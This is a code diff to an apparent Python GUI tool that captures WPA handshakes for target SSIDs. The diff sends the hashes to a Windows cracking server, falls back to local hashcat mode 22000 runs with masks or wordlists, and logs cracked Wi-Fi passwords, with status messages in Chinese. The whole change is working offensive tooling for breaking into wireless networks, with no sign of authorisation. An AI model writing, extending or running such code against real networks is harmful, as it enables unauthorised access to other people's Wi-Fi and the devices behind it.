@@ -776,11 +776,19 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
             self._log('   本輪沒抓到 %s 的握手包 — 再抓一輪' % ssid)
             time.sleep(3)
             return
-        # ---- 3. post ----
-        posted = self._post(self._target_lines(), ssid, bssid, wip, port)
-        if not posted:
-            self.set_phase('crack', 'Windows 離線 → Mac 本機破解',
-                           'hashcat 本機跑（較慢）')
+        # ---- 3. post (Windows 決定: 秒回 / 自動解 / 掛起待確認) ----
+        status, pw = self._post(self._target_lines(), ssid, bssid, wip, port)
+        if status == 'cracked':
+            self.set_phase('done', '🎉 破解成功', pw)
+            self._result('🎉  %s' % pw, C_GREEN)
+            self._log('🎉🎉 密碼: %s  (%s)' % (pw, ssid))
+            return
+        use_local = (status is False) or (status == 'pending'
+                                          and not self._on_home_lan())
+        if use_local:
+            why = ('Windows 連不上' if status is False
+                   else '外出且 Windows 顯存被佔用')
+            self.set_phase('crack', '%s → Mac 本機破解' % why, 'hashcat 本機跑')
             self._result('本機破解中…', C_AMBER)
             result = self._crack_local()
             if result:
@@ -795,8 +803,13 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                     return
                 time.sleep(1)
             return
-        # ---- 4. wait Windows ----
-        self.set_phase('crack', 'Windows 破解中...', 'watching %s:%s' % (wip, port))
+        # ---- 4. wait Windows (自動解 或 在家等你在網頁確認) ----
+        if status == 'pending':
+            self.set_phase('crack', '等待你在 Windows 網頁按「開始破解」',
+                           '顯存被本地模型佔用')
+        else:
+            self.set_phase('crack', 'Windows 破解中...',
+                           'watching %s:%s' % (wip, port))
         self._result('破解中…', C_AMBER)
         result = self._wait_result(wip, port, timeout=900)
         if result:
@@ -882,18 +895,29 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
             self._ui(lambda d=desc: self._set_text(
                 self.phases['crack_sub'], 'Mac 本機: %s' % d))
             self._log('   本機階段: %s' % desc)
-            cmd = [hc, '-m', '22000', '-O', '-w', '3',
+            cmd = [hc, '-m', '22000', '-w', '3',
                    '--potfile-path', pot, '--outfile-format', '2', hf]
             cmd += ['-a', '3', mask] if mask else [wl]
             try:
-                subprocess.run(cmd, capture_output=True,
-                               timeout=1500 if len(mask or '') > 20 else 600)
+                subprocess.run(cmd, capture_output=True, timeout=900)
             except subprocess.TimeoutExpired:
                 self._log('   階段逾時，跳過')
             pw = self._read_pot_pw(pot)
             if pw:
                 return pw
         return None
+
+    def _on_home_lan(self):
+        import socket
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(1)
+            s.connect(('192.168.1.1', 1))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip.startswith('192.168.1.')
+        except Exception:
+            return False
 
     def _post(self, hashes, ssid, bssid, wip, port):
         payload = json.dumps({'hash': '\n'.join(hashes), 'ssid': ssid,
@@ -908,14 +932,17 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
             self._log('   上傳成功: %s' % body[:140])
             try:
                 d = json.loads(body)
-                if d.get('password'):
-                    self._log('   ✅ potfile 秒回: %s' % d['password'])
             except Exception:
-                pass
-            return True
+                d = {}
+            if d.get('password'):
+                self._log('   ✅ Windows potfile 秒回: %s' % d['password'])
+                return 'cracked', d['password']
+            if d.get('pending'):
+                return 'pending', None
+            return 'auto', None
         except Exception as e:
             self._log('   上傳失敗: %s' % e)
-            return False
+            return False, None
 
     def _wait_result(self, wip, port, timeout=900):
         start = time.time()
